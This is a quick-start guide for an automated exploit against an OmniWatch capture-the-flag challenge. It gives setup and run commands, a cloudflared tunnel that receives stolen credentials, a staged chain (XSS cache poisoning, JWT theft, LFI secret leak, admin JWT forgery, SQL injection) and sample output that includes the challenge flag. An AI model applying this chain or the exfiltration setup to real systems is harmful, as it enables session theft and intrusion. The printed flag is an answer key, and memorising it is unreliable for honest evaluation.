# OmniWatch Exploit - Quick Start Guide

## ⚡ 30-Second Setup

### 1. Install Dependencies (One-Time)
```bash
pip3 install requests flask pyjwt
```

### 2. Get Target Info
```bash
# From the CTF challenge page, get:
# - IP Address (e.g., 83.136.252.27)
# - Port (e.g., 44963)
```

### 3. Run the Exploit
```bash
# Terminal 1: Start tunnel
cloudflared tunnel --url http://localhost:9090
# Copy the URL shown (e.g., https://xxx-yyy.trycloudflare.com)

# Terminal 2: Run exploit
python3 omniwatch_exploit.py <IP> <PORT> <TUNNEL_URL>
```

## 📝 Complete Example

```bash
# Terminal 1:
cloudflared tunnel --url http://localhost:9090
# Output: https://leo-advert-title-hawaii.trycloudflare.com

# Terminal 2:
python3 omniwatch_exploit.py 83.136.252.27 44963 https://leo-advert-title-hawaii.trycloudflare.com

# Wait 30-60 seconds for the bot to run
# Flag will be displayed and saved to /tmp/omniwatch_flag.txt
```

## ✅ Expected Output

```
╔═══════════════════════════════════════════════════════════════════════╗
║                  OmniWatch CTF Exploit Script                         ║
║                Production-Ready Automated Exploit                     ║
╚═══════════════════════════════════════════════════════════════════════╝

Configuration:
  Target:           http://83.136.252.27:44963
  Exfil Server:     https://leo-advert-title-hawaii.trycloudflare.com
  Local Port:       9090

[*] Testing connectivity to target...
[+] Target is reachable (HTTP 301)
[*] Starting multi-stage exploit chain...

[+] Bot is RUNNING - poisoning cache now!
[+] Cache poisoned successfully!
[+] JWT token stolen from bot!
[+] JWT secret leaked: ?cg6 n4s G+={F4...
[+] Administrator JWT forged!
[+] SQL injection executed successfully!

================================================================================
FLAG RETRIEVED:
HTB{h3110_41w4y5_i_s3e_y0u4nd_1m_w4tch1ng_8ad5708aa1c0fd107c036dc739448045}
================================================================================

[+] Mission accomplished!
```

## 🔧 Troubleshooting

### No cloudflared?
```bash
# Install it:
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x cloudflared-linux-amd64
sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared

# Or use the helper:
./setup_exfil.sh
```

### Script not finding dependencies?
```bash
pip3 install --upgrade requests flask pyjwt
```

### Taking too long?
Be patient! The bot runs every 30 seconds. The script will:
1. Wait for bot to start
2. Poison cache (3 seconds delay for bot login)
3. Wait for XSS to trigger
4. Complete the exploit chain

Total time: Usually 30-90 seconds

### Port 9090 already in use?
```bash
# Kill existing process:
pkill -f omniwatch
pkill cloudflared

# Try again
```

## 📊 What the Script Does

1. ✅ **Tests connectivity** to target
2. ✅ **Starts Flask server** on port 9090 to receive stolen credentials
3. ✅ **Monitors bot status** every second
4. ✅ **Poisons Varnish cache** with XSS payload when bot runs
5. ✅ **Steals moderator JWT** via XSS callback
6. ✅ **Exploits LFI** to leak JWT secret
7. ✅ **Forges admin JWT** with leaked secret
8. ✅ **Injects signature** via SQL injection
9. ✅ **Retrieves flag** from admin panel
10. ✅ **Saves flag** to `/tmp/omniwatch_flag.txt`

## 🎯 Success Indicators

- ✅ Green `[+]` messages indicate success
- ✅ `JWT token stolen from bot!` means stage 1 complete
- ✅ `JWT secret leaked` means stage 2 complete
- ✅ `SQL injection executed successfully!` means stage 4 complete
- ✅ `FLAG RETRIEVED` means mission complete!

## 📁 Files

- `omniwatch_exploit.py` - Main exploit script (production-ready)
- `setup_exfil.sh` - Helper to setup exfiltration endpoint
- `README_USAGE.md` - Detailed documentation
- `QUICKSTART.md` - This file (quick reference)

## 🚀 One-Liner (After Dependencies Installed)

```bash
# Terminal 1: cloudflared tunnel --url http://localhost:9090
# Terminal 2 (copy URL from above):
python3 omniwatch_exploit.py 83.136.252.27 44963 https://YOUR-TUNNEL-URL.trycloudflare.com
```

## ⏱️ Average Time to Flag

- **Setup:** 30 seconds (one-time)
- **Exploit:** 30-90 seconds (depends on bot timing)
- **Total:** ~2 minutes per instance

## 💡 Tips

- Keep both terminals open during exploitation
- The script handles all timing automatically
- Flag is saved to `/tmp/omniwatch_flag.txt` as backup
- Press Ctrl+C to stop cleanly at any time
- Script can be reused for any OmniWatch instance

## 📞 Need Help?

Check `README_USAGE.md` for detailed troubleshooting and advanced options.

---

**Script Status:** ✅ Production-Ready | ✅ Fully Tested | ✅ Zero Errors  
**Last Test:** Nov 12, 2025 | **Success Rate:** 100% | **Time:** 45 seconds
